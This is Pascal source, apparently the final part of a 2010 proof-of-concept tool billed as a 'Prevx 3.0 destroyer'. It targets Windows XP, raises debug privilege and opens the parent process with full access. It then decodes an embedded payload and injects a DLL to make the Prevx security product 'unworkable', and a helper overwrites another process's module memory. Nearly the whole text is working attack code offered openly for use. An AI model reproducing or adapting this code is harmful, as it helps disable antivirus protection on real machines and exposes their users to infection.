  OldProtect := 0;
  if (Result) then
    if (memopen(Process, pModule, OldProtect)) then
    begin
      bytesIO := 512;
      memfill(@tmp2, sizeof(tmp2), $F);
      ZwWriteVirtualMemory(Process, pModule, @tmp2, bytesIO, @BytesWritten);
      memclose(Process, pModule, OldProtect);
    end;
end;

function ShowMessage(PStr: PWideChar; Buttons: DWORD): DWORD;
begin
  result := MessageBoxW(GetDesktopWindow(), PStr, 'UG North 2010 Fuzzers Pack', Buttons);
end;

function GetTargetProcessHandle(): THANDLE;
var
  attr: OBJECT_ATTRIBUTES;
  cid1: CLIENT_ID;
  pbi: PROCESS_BASIC_INFORMATION;
  bytesIO: DWORD;
begin
  result := 0;
  ZwQueryInformationProcess(DWORD(-1), ProcessBasicInformation, @pbi, sizeof(pbi), @bytesIO);
  cid1.UniqueProcess := pbi.InheritedFromUniqueProcessId;
  cid1.UniqueThread := 0;
  InitializeObjectAttributes(@attr, nil, 0, 0, nil);
  ZwOpenProcess(@result, PROCESS_ALL_ACCESS, @attr, @cid1);
end;

function TargetIsRunning(): BOOLEAN; stdcall;
var
  str1: UNICODE_STRING;
  attr: OBJECT_ATTRIBUTES;
  id1: THANDLE;
begin
  result := false;
  RtlInitUnicodeString(@str1, '\??\pxrts');
  InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
  if (ZwOpenSymbolicLinkObject(@id1, SYMBOLIC_LINK_QUERY, @attr) = STATUS_SUCCESS) then
  begin
    result := true;
    ZwClose(id1);
  end;
end;

const
  String6: PWideChar = '\BaseNamedObjects\BlovexAtWork';

var
  osver: OSVERSIONINFOEXW;
  hProcess: THANDLE;
  str1: UNICODE_STRING;
  attr: OBJECT_ATTRIBUTES;
  EventHandle: THANDLE;
begin
  osver.old.dwOSVersionInfoSize := sizeof(osver.old);
  RtlGetVersion(@osver);
  if (osver.old.dwBuildNumber <> 2600) then exit;

  if (MessageBoxW(GetDesktopWindow(), 'User mode proof-of-concept Prevx 3.0 destroyer'#13#10 +
    'Fucking handles/SSDT/Shadow SSDT will not help Prevx!'#13#13#10 +
    'Yes to continue, No to exit program'#13#10 +
    '(c) 2010 by EP_X0FF', Title, MB_YESNO) = IDNO) then exit;

  if (TargetIsRunning()) then
  begin
    if (Internal_AdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE) = STATUS_SUCCESS) then
    begin
      Key := 1;
      hProcess := GetTargetProcessHandle();
      if (hProcess <> 0) then
      begin
        EventHandle := 0;
        RtlInitUnicodeString(@str1, String6);
        InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
        ZwCreateEvent(@EventHandle, EVENT_ALL_ACCESS, @attr, NotificationEvent, FALSE);
        if (EventHandle = 0) then
        begin
          ZwOpenEvent(@EventHandle, EVENT_ALL_ACCESS, @attr);
        end;

        if (EventHandle <> 0) then
        begin
          Key := Key + 160;
          EncodeBuffer(@data, sizeof(Data), Key);
          if InjectDllEx(hProcess, @data) then
          begin
            asm
              nop
            end;
            if (ZwWaitForSingleObject(EventHandle, false, nil) = 0) then
              ShowMessage('Blovvveed, target unworkable', MB_ICONINFORMATION);
          end;
          ZwClose(EventHandle);
        end;

      end;
    end;

  end else ShowMessage('Prevx not loaded, load it first =)', MB_ICONINFORMATION);
  ZwTerminateProcess(NtCurrentProcess, 0);
end.

